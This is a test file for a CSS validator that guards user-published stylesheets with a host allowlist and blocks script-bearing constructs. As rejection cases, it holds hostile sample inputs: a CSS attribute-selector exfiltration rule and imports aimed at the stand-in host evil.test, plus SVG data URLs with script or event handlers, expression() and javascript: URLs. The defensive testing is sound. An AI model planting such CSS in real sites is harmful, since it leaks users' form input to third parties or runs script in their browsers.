import { readFileSync } from "node:fs";

import { describe, expect, it } from "vite-plus/test";

import { DEFAULT_ALLOWED_HOSTS, validateCss, type IssueCode } from "../src/index";

const STOCK_SHEET = new URL("../../../DS1/1-root/component-tokens.css", import.meta.url);

const NUL = String.fromCharCode(0);
const LONE_HIGH_SURROGATE = String.fromCharCode(0xd800);
const BOM = String.fromCharCode(0xfeff);

function codes(css: string): IssueCode[] {
  return validateCss(css).issues.map((issue) => issue.code);
}

function expectRejected(css: string, code: IssueCode): void {
  const result = validateCss(css);
  expect(result.ok).toBe(false);
  expect(result.issues.map((issue) => issue.code)).toContain(code);
}

function expectAccepted(css: string): void {
  const result = validateCss(css);
  expect(result.issues.filter((issue) => issue.severity === "error")).toEqual([]);
  expect(result.ok).toBe(true);
}

describe("the stock DS1 stylesheet", () => {
  // The regression that catches a DS1 change silently breaking publishing for
  // every existing library.
  it("validates clean", () => {
    const stock = readFileSync(STOCK_SHEET, "utf8").replace(/^@import[^;]+;\s*/gm, "");
    const result = validateCss(stock);

    expect(result.issues).toEqual([]);
    expect(result.ok).toBe(true);
    expect(result.truncated).toBe(false);
    expect(result.byteSize).toBe(new TextEncoder().encode(stock).byteLength);
  });

  it("still validates once the workbench has rewritten token values", () => {
    const css = readFileSync(STOCK_SHEET, "utf8").replace(/^@import[^;]+;\s*/gm, "")
      .replace(/--ds-accent-color:\s*[^;]+;/, "--ds-accent-color: #ff0066;")
      .replace(/--ds-radius:\s*[^;]+;/, "--ds-radius: 14px;")
      .replace(/--ds-unit:\s*[^;]+;/, "--ds-unit: 24px;");

    expectAccepted(css);
  });
});

describe("size, emptiness and encoding", () => {
  it("rejects an empty stylesheet", () => {
    expectRejected("   \n\t  ", "empty");
  });

  it("rejects a stylesheet over the byte ceiling", () => {
    expectRejected(`a{color:red}${"/* padding */".repeat(60_000)}`, "too_large");
  });

  it("does not attempt to parse an oversized stylesheet", () => {
    expect(codes(`a{color:${"z".repeat(600_000)}`)).toEqual(["too_large"]);
  });

  it("warns without failing between the warn and error ceilings", () => {
    const result = validateCss(`a{color:red}\n${"/* pad */".repeat(20_000)}`);

    expect(result.byteSize).toBeGreaterThan(128 * 1024);
    expect(result.ok).toBe(true);
    expect(result.issues.map((issue) => issue.severity)).toContain("warning");
  });

  it("rejects a NUL character", () => {
    expectRejected(`a{color:red}${NUL}`, "control_characters");
  });

  it("rejects an unpaired surrogate", () => {
    expectRejected(`a::after{content:"${LONE_HIGH_SURROGATE}"}`, "control_characters");
  });

  it("tolerates a leading BOM", () => {
    expectAccepted(`${BOM}a{color:red}`);
  });

  it("accepts well-formed astral-plane characters", () => {
    expectAccepted(`a::after{content:"${String.fromCodePoint(0x1f600)}"}`);
  });
});

describe("malformed CSS", () => {
  it("rejects an unclosed block that swallows the rules after it", () => {
    expectRejected("a{color:red\nb{color:blue}", "parse_error");
  });

  it("rejects a stray closing brace", () => {
    expectRejected("a{color:red}}", "parse_error");
  });

  it("rejects a computed url(), which would defeat the host allowlist", () => {
    expectRejected("a{background:url(var(--evil))}", "parse_error");
  });

  it("accepts a block left unclosed at end of file, as every browser does", () => {
    // CSS error recovery closes open blocks at EOF, so this is well-defined and
    // harmless — nothing follows to be swallowed. Rejecting it would fail a
    // stylesheet that renders identically everywhere.
    expectAccepted("a{color:red");
  });
});

describe("at-rules", () => {
  it("rejects an at-rule outside the allowlist", () => {
    expectRejected("@document url(https://dsone.dev/){a{color:red}}", "unknown_at_rule");
  });

  it("accepts modern layout and theming at-rules", () => {
    expectAccepted("@layer base{a{color:red}}");
    expectAccepted("@container (min-width: 20rem){a{color:red}}");
    expectAccepted("@scope (.card){a{color:red}}");
    expectAccepted("@property --x{syntax:'<color>';inherits:false;initial-value:red}");
    expectAccepted("@supports (display:grid){a{display:grid}}");
    expectAccepted("@media (prefers-reduced-motion: reduce){a{transition:none}}");
  });

  it("accepts light-dark(), which the stock sheet relies on", () => {
    expectAccepted(":root{--bg:light-dark(#fff,#000);background:var(--bg)}");
  });

  it("rejects @charset anywhere but the first byte", () => {
    expectRejected(`a{color:red}\n@charset "utf-8";`, "charset_position");
  });

  it("accepts @charset at the first byte", () => {
    expectAccepted(`@charset "utf-8";\na{color:red}`);
  });
});

describe("@import", () => {
  it("accepts the Google Fonts import the stock sheet ships with", () => {
    expectAccepted(
      `@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400&display=swap");\na{color:red}`,
    );
  });

  it("accepts the quoted-string form", () => {
    expectAccepted(`@import "https://fonts.googleapis.com/css2?family=Inter";\na{color:red}`);
  });

  it("rejects an insecure import", () => {
    expectRejected(`@import url("http://evil.test/x.css");`, "disallowed_import_host");
  });

  it("rejects a protocol-relative import", () => {
    expectRejected(`@import "//evil.test/x.css";`, "disallowed_import_host");
  });

  it("rejects an import from an unlisted host", () => {
    expectRejected(`@import url("https://evil.test/x.css");`, "disallowed_import_host");
  });

  it("rejects a relative import", () => {
    expectRejected(`@import url("./other.css");`, "unresolvable_url");
  });

  it("rejects more imports than the limit", () => {
    const line = `@import url("https://fonts.googleapis.com/css2?family=Inter");\n`;
    expectRejected(line.repeat(6), "too_many_imports");
  });

  it("allows exactly the import limit", () => {
    const line = `@import url("https://fonts.googleapis.com/css2?family=Inter");\n`;
    expectAccepted(`${line.repeat(5)}a{color:red}`);
  });

  it("reports a bad import host once, not twice", () => {
    const hostIssues = codes(`@import url("https://evil.test/x.css");`).filter(
      (code) => code === "disallowed_import_host" || code === "disallowed_url_host",
    );
    expect(hostIssues).toEqual(["disallowed_import_host"]);
  });
});

describe("url() host allowlist", () => {
  // The reason the allowlist exists: an attribute selector plus a background
  // image leaks form field contents to a third party one character at a time.
  it("rejects the attribute-selector exfiltration pattern", () => {
    expectRejected(`input[value^="a"]{background:url(https://evil.test/a)}`, "disallowed_url_host");
  });

  it("rejects a font served from an unlisted host", () => {
    expectRejected(
      "@font-face{font-family:X;src:url(https://evil.test/x.woff2) format('woff2')}",
      "disallowed_url_host",
    );
  });

  it("accepts a font from an allowed host", () => {
    expectAccepted("@font-face{font-family:X;src:url(https://fonts.gstatic.com/x.woff2) format('woff2')}");
  });

  it("checks url() in every property, not just backgrounds", () => {
    expectRejected("a{cursor:url(https://evil.test/c.png),auto}", "disallowed_url_host");
    expectRejected("a{list-style-image:url(https://evil.test/b.png)}", "disallowed_url_host");
    expectRejected("a{mask-image:url(https://evil.test/m.svg)}", "disallowed_url_host");
    expectRejected("a{border-image-source:url(https://evil.test/i.png)}", "disallowed_url_host");
  });

  it("checks url() inside a custom property", () => {
    expectRejected(":root{--bg:url(https://evil.test/x.png)}a{background:var(--bg)}", "disallowed_url_host");
  });

  it("accepts url() inside a custom property when the host is allowed", () => {
    expectAccepted(":root{--bg:url(https://cdn.jsdelivr.net/x.png)}a{background:var(--bg)}");
  });

  it("allows fragment references, which make no network request", () => {
    expectAccepted("a{fill:url(#gradient);filter:url(#blur);clip-path:url(#clip)}");
  });

  it("rejects a relative asset URL that could never resolve", () => {
    expectRejected("@font-face{font-family:X;src:url(./fonts/x.woff2)}", "unresolvable_url");
  });

  it("rejects a javascript: URL", () => {
    const result = validateCss("a{background:url(javascript:alert(1))}");
    expect(result.ok).toBe(false);
  });

  it("honours a caller-supplied host allowlist", () => {
    const result = validateCss("a{background:url(https://mycdn.test/x.png)}", {
      allowedHosts: ["mycdn.test"],
    });
    expect(result.ok).toBe(true);
  });

  it("does not treat an allowed host as a suffix or prefix match", () => {
    expectRejected("a{background:url(https://dsone.dev.evil.test/x.png)}", "disallowed_url_host");
    expectRejected("a{background:url(https://notdsone.dev/x.png)}", "disallowed_url_host");
  });
});

describe("data: URLs", () => {
  const svgUrl = (markup: string): string =>
    `a{background:url("data:image/svg+xml,${encodeURIComponent(markup)}")}`;

  it("accepts a small script-free SVG", () => {
    expectAccepted(svgUrl(`<svg xmlns="http://www.w3.org/2000/svg"><rect width="4" height="4"/></svg>`));
  });

  it("rejects an SVG containing a script element", () => {
    expectRejected(
      svgUrl(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`),
      "disallowed_construct",
    );
  });

  it("rejects an SVG containing an inline event handler", () => {
    expectRejected(
      svgUrl(`<svg xmlns="http://www.w3.org/2000/svg"><rect onload="alert(1)"/></svg>`),
      "disallowed_construct",
    );
  });

  it("rejects a base64 SVG hiding a script", () => {
    const encoded = btoa(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`);
    expectRejected(`a{background:url("data:image/svg+xml;base64,${encoded}")}`, "disallowed_construct");
  });

  it("rejects a non-image data: type", () => {
    expectRejected(`a{background:url("data:text/html,<b>hi</b>")}`, "data_url_type");
  });

  it("rejects an oversized data: URL", () => {
    expectRejected(`a{background:url("data:image/png;base64,${"A".repeat(70 * 1024)}")}`, "data_url_too_large");
  });

  it("rejects every data: URL when the caller disables them", () => {
    const result = validateCss(`a{background:url("data:image/png;base64,AAAA")}`, { allowDataUrls: false });
    expect(result.ok).toBe(false);
    expect(result.issues.map((issue) => issue.code)).toContain("data_url_type");
  });
});

describe("script-execution constructs", () => {
  it("rejects -moz-binding", () => {
    expectRejected("a{-moz-binding:url(https://dsone.dev/x.xml#y)}", "disallowed_construct");
  });

  it("rejects the legacy behavior property", () => {
    expectRejected("a{behavior:url(https://dsone.dev/x.htc)}", "disallowed_construct");
  });

  it("rejects expression()", () => {
    expectRejected("a{width:expression(alert(1))}", "disallowed_construct");
  });

  it("rejects expression() hidden in a custom property", () => {
    expectRejected(":root{--w:expression(alert(1))}a{width:var(--w)}", "disallowed_construct");
  });
});

describe("selectors are deliberately not policed", () => {
  // Existing custom libraries may restyle bare elements; any
  // broad-selector rule would fire on the stock sheet itself.
  it("accepts element, universal and :where() selectors", () => {
    expectAccepted("html,body,*{margin:0}");
    expectAccepted(":where(button,input,select){font:inherit}");
    expectAccepted("table td,table th{padding:8px}");
  });
});

describe("result shape", () => {
  it("sorts issues by position", () => {
    const css = [
      "a{background:url(https://evil-one.test/x)}",
      "b{background:url(https://evil-two.test/x)}",
      "c{background:url(https://evil-three.test/x)}",
    ].join("\n");

    const offsets = validateCss(css).issues.map((issue) => issue.offset ?? -1);
    expect(offsets).toEqual([...offsets].sort((a, b) => a - b));
  });

  it("caps the issue list and flags truncation", () => {
    const css = Array.from(
      { length: 80 },
      (_, index) => `.r${index}{background:url(https://evil.test/${index})}`,
    ).join("\n");

    const result = validateCss(css);
    expect(result.issues.length).toBe(50);
    expect(result.truncated).toBe(true);
    expect(result.ok).toBe(false);
  });

  it("reports byte size, not character count", () => {
    const css = `a::after{content:"é"}`;
    expect(validateCss(css).byteSize).toBe(new TextEncoder().encode(css).length);
  });

  it("anchors host violations to a line and column", () => {
    const issue = validateCss("a{color:red}\nb{background:url(https://evil.test/x)}").issues[0];
    expect(issue?.line).toBe(2);
    expect(issue?.column).toBeGreaterThan(0);
    expect(issue?.detail).toContain("evil.test");
  });

  it("exports the documented default host allowlist", () => {
    expect(DEFAULT_ALLOWED_HOSTS).toContain("fonts.googleapis.com");
    expect(DEFAULT_ALLOWED_HOSTS).toContain("fonts.gstatic.com");
    expect(DEFAULT_ALLOWED_HOSTS).not.toContain("evil.test");
  });
});
